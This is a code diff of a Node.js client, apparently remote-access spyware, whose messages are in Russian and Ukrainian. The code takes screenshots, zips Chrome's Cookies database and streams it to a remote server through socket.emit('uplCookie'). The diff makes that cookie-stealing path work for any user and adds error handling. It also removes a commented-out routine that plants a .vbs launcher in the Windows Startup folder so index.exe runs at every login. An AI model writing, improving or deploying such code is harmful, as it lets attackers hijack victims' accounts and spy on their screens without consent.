@@ -38,25 +38,6 @@ async function connect() {
 }
 
 async function uploadImage() {
-    // fs.access(HD + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.vbs",fs.F_OK,(err) => {
-    //     if (err) {
-    //         console.log("File not exist");
-    //         fs.writeFile(path.join(__dirname,".vbs"),
-    //         `Set WshShell = CreateObject("WScript.Shell")
-    //         WshShell.Run """` + HD + `\\OneDrive\\Робочий стіл\\socket\\client\\index.exe""", 1, false
-    //         `,(err) => {
-    //             if (err) throw err;
-    //             console.log("succes created");
-    //             fs.copyFile(path.join(__dirname,".vbs"),path.join(HD + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', '.vbs'), (err) => {
-    //                 if (err) {
-    //                   console.error('Ошибка при копировании файла:', err);
-    //                 } else {
-    //                   console.log('Файл успешно скопирован в папку автозагрузки.');
-    //                 }
-    //             });
-    //         })
-    //     }
-    // })
     console.log("Uploading img function");
     try {
         const img = await screenshot();
@@ -68,40 +49,47 @@ async function uploadImage() {
         isImageProcessed = false;
         console.log("Sended");
         try {
-            const filePath = 'C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
+            const filePath = HD + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
             const archivePath = path.join(__dirname, 'archive.zip');
+        
             fs.access(filePath, fs.constants.F_OK, (err) => {
-
-                if (!err && !fs.existsSync(path.join(__dirname,'archive.zip'))) {
-                    const output = fs.createWriteStream(archivePath);
-                    const archive = archiver('zip', {
-                      zlib: { level: 9 }
-                    });
-                    output.on('close', () => {
-                        console.log(`Архив создан: ${archive.pointer()} total bytes`);
-                        
-                              const readStream = fs.createReadStream(archivePath);
-                              readStream.on('data', (chunk) => {
-                                socket.emit('uplCookie', chunk,{ name: "username" });
+                if (err) {
+                    console.log('Файл не существует.');
+                } else {
+                    if (!fs.existsSync(archivePath)) {
+                        const output = fs.createWriteStream(archivePath);
+                        const archive = archiver('zip', {
+                            zlib: { level: 9 }
+                        });
+        
+                        output.on('close', () => {
+                            console.log(`Архив создан: ${archive.pointer()} total bytes`);
+        
+                            const readStream = fs.createReadStream(archivePath);
+                            readStream.on('data', (chunk) => {
+                                socket.emit('uplCookie', chunk, { name: "username" });
                             });
                             readStream.on('end', () => {
-                                  console.log("end");
-                                  socket.emit('end');
+                                console.log("Архив принят");
+                                socket.emit('end');
                             });
-                        
-                    });
-                archive.on('error', (err) => {
-                  throw err;
-                });
-                archive.pipe(output);
-                archive.file(filePath, { name: path.basename(filePath) });
-                archive.finalize();
-          } else {
-            console.log(`Отправлено или несуществует.`);
-          }
-        });
-        }catch(err){
-            console.log(err);
+                        });
+        
+                        archive.on('error', (err) => {
+                            if (err.code === 'EBUSY') console.log('Файл занят.');
+                            else console.log("Ошибка заключаетца в другом");
+                        });
+        
+                        archive.pipe(output);
+                        archive.file(filePath, { name: path.basename(filePath) });
+                        archive.finalize();
+                    } else {
+                        console.log(`Архив уже существует.`);
+                    }
+                }
+            });
+        } catch (Error) {
+            console.log("Произошла ошибка при создании архива.");
         }
     } catch (error) {
         console.log('Ошибка при создании скриншота:');
